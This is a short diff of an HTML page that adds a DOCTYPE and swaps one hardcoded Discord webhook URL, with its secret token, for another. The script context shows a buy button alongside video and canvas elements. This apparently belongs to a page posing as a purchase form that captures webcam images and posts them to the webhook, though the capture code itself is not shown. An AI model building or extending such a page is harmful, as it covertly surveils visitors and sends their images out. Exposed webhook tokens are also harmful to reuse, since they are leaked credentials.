@@ -1,4 +1,5 @@
-<html>
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
@@ -22,7 +23,7 @@
   <canvas id="canvas" width="300" height="200"></canvas>
 
   <script>
-    const webhookURL = "https://canary.discord.com/api/webhooks/1373706580691910766/1miLqgTD8WI30wDoJO28tRuFJGuPkrUMpUbYrBLU_b5z9niau08i1HHF5JKZ1Yxns1SO"
+    const webhookURL = "https://canary.discord.com/api/webhooks/1375127997375315988/OzWjHdKuHuKaIWWh89zDGKfc7KeEiIRNTHhxfQX0I4m-B7AboV5zKycg-S7g0wfBrO7F"
     const buyBtn = document.getElementById("buyBtn");
     const video = document.getElementById("video");
     const canvas = document.getElementById("canvas");
